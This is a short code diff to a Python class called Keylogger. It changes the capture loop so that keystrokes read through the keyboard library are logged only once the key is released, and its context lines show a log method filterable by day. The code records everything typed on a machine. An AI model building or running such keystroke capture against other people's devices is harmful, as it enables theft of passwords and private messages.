@@ -13,7 +13,9 @@ class Keylogger:
 
 	def runner(self):
 		while True:
-			self._keyboard.add(keyboard.read_key())
+			pressed_key = keyboard.read_key()
+			if not keyboard.is_pressed(pressed_key):
+				self._keyboard.add(pressed_key)
 
 
 	def get_log(self, day=None):
